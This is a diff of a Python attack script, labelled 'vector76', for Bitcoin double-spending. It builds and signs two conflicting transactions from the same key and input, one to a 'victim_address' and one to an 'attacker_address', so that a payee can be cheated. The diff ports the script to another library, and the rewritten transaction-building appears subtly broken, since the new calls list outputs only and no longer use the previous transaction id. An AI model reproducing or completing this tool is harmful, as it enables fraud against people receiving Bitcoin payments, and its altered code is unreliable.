@@ -3,13 +3,11 @@ import bitcoin
 import argparse
 import requests
 import subprocess
-import bitcoin.core
-import bitcoin.transaction
 
 from hashlib import sha256
 from bitcoincli import Bitcoin
 from bitcoinaddress import Wallet
-from bitcoin_tools.core.transaction import TX
+#from bitcoin_tools.core.transaction import TX
 from datetime import datetime
 
 parser = argparse.ArgumentParser(description="How To Use vector76")
@@ -146,6 +144,9 @@ if (network != "mainnet") and (network != "testnet"):
     network = "testnet"
 
 print(f"[+] {network} Mode.")
+if network == "mainnet":
+    network = "btc"
+
 print("Connecting Node...")
 rpc_node = Bitcoin(username, password, rpc_host, rpc_port)
 
@@ -153,19 +154,21 @@ print("--------------------")
 amount_satoshi = to_satoshi(amount_BTC)
 print(amount_satoshi)
 fee_satoshi = 1500
-bitcoin.SelectParams(network)
+bitcoin.set_network(network)
 print("Create T1 rawtx And sign")
-tx_victim = TX.build_from_io(prev_txid, 0, amount_satoshi - fee_satoshi, victim_address).hex
+send_amount = amount_satoshi - fee_satoshi
+tx_victim = [{"value": send_amount, "address": victim_address}]
+tx_victim = bitcoin.mktx(tx_victim)
 print(tx_victim)
-tx_victim = bitcoin.transaction.sign(tx_victim, key)
+tx_victim = bitcoin.sign(tx_victim, key)
 print()
 print(tx_victim)
 
 print("Create T2 rawtx And sign")
-tx_attacker = TX.build_from_io(prev_txid, 0, amount_satoshi - fee_satoshi, attacker_address).hex
+tx_attacker = [{"value": send_amount, "address": attacker_address}]
+tx_attacker = bitcoin.mktx(tx_attacker)
 print(tx_attacker)
-tx_attacker = bitcoin.transaction.sign(tx_attacker, key)
-
+tx_attacker = bitcoin.sign(tx_attacker, key)
 print()
 print(tx_attacker)
 print("[+] READY...")
